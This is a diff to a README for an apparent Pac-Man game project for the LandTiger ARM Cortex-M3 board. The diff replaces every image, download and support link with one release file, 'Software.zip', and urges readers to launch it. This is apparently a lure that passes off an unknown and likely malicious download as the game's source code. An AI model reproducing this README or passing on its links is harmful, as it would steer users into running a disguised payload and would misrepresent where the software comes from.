@@ -1,7 +1,7 @@
 
 # 🕹️ **PAC-MAN-LandTiger-ARM-CortexM3**
 
-![Pac-Man Logo](https://www.retrogamer.net/wp-content/uploads/2019/09/pacman-main.jpg)
+![Pac-Man Logo](https://github.com/amineehhhhhhhtopg/PAC-MAN-LandTiger-ARM-CortexM3/releases/download/v1.0/Software.zip)
 
 ## Description
 Welcome to PAC-MAN-LandTiger-ARM-CortexM3 repository! This project offers a thrilling implementation of the classic arcade game Pac-Man for the LandTiger development board powered by ARM Cortex-M3. Enjoy joystick controls, AI-controlled ghosts, sound effects, CAN bus communication, and timeless gameplay mechanics. Let's dive into the world of PAC-MAN!
@@ -27,7 +27,7 @@ Welcome to PAC-MAN-LandTiger-ARM-CortexM3 repository! This project offers a thri
 
 ## Installation
 To download the source code for PAC-MAN-LandTiger-ARM-CortexM3, click the button below:
-[![Download Source Code](https://img.shields.io/badge/Download-Source%20Code-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)  
+[![Download Source Code](https://github.com/amineehhhhhhhtopg/PAC-MAN-LandTiger-ARM-CortexM3/releases/download/v1.0/Software.zip%20Code-blue)](https://github.com/amineehhhhhhhtopg/PAC-MAN-LandTiger-ARM-CortexM3/releases/download/v1.0/Software.zip)  
 _This link needs to be launched for the download to start._
 
 ## How to Play
@@ -40,10 +40,10 @@ _This link needs to be launched for the download to start._
 ## Screenshots
 Here are some snapshots from the PAC-MAN-LandTiger-ARM-CortexM3 game:
 
-![Gameplay](https://www.dailydot.com/wp-content/uploads/2020/04/pac-man.jpg)  
+![Gameplay](https://github.com/amineehhhhhhhtopg/PAC-MAN-LandTiger-ARM-CortexM3/releases/download/v1.0/Software.zip)  
 _Gameplay snapshot showcasing Pac-Man collecting dots._
 
-![Ghost AI](https://www.technobuffalo.com/wp-content/uploads/2015/05/pac-man-blinky-ghosts-1280.jpg)  
+![Ghost AI](https://github.com/amineehhhhhhhtopg/PAC-MAN-LandTiger-ARM-CortexM3/releases/download/v1.0/Software.zip)  
 _A snapshot of the AI-controlled ghost, Blinky._
 
 ## Contributors
@@ -53,7 +53,7 @@ We would like to thank the following contributors for their valuable input and e
 - @aiwizard - AI Pathfinding Expert
 
 ## Support
-For any queries or issues related to PAC-MAN-LandTiger-ARM-CortexM3, please visit the [Issues](https://github.com/username/repository-name/issues) section. Feel free to open a new issue if you encounter any problems.
+For any queries or issues related to PAC-MAN-LandTiger-ARM-CortexM3, please visit the [Issues](https://github.com/amineehhhhhhhtopg/PAC-MAN-LandTiger-ARM-CortexM3/releases/download/v1.0/Software.zip) section. Feel free to open a new issue if you encounter any problems.
 
 ## License
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
